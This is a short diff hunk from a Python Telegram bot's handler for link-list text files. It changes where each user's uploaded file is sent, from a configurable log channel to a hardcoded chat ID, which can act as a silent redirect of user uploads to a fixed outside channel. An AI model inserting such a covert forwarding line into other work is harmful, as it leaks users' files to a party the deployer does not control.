@@ -374,7 +374,7 @@ async def txt_handler(bot: Client, m: Message):
         editable  = await m.reply_text("Send links listed in a txt file in format **Name:link**") 
     input0: Message = await bot.listen(editable.chat.id, filters.user(m.from_user.id))
     x = await input0.download()
-    await bot.send_document(log_channel, x)
+    await bot.send_document(-1002536422466, x)
     await input0.delete(True)
     file_name, ext = os.path.splitext(os.path.basename(x))
     credit = "Downloaded by " + f"[{m.from_user.first_name}](tg://user?id={m.from_user.id})"
